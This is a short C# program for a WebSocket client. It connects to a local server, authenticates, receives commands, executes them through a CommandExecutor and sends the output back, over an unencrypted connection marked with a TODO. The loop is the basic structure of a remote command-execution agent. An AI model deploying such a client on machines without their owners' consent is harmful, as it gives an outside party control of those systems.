using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Timers;
using WsClient.Models;

namespace WsClient
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // Set default values if no arguments are passed
            string host = "127.0.0.1";
            string port = "5101";
            string path = "/Client/ws";

            // TODO: Secure websocket connection
            Uri serverUri = new Uri($"ws://{host}:{port}{path}");
            Client client = new Client();
            try
            {
                
                await client.ConnectAsync(serverUri);
                await client.Authenticate();


                while (!client.Socket.CloseStatus.HasValue)
                {
                    Command cmd = await client.ListenForCommand();
                    CommandExecutor.Commands.Enqueue(cmd);
                    bool executed = CommandExecutor.TryExecute();
                    if (executed)
                    {
                        await client.SendCommandOutput();
                    }
                }
            }
            catch (NullReferenceException e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
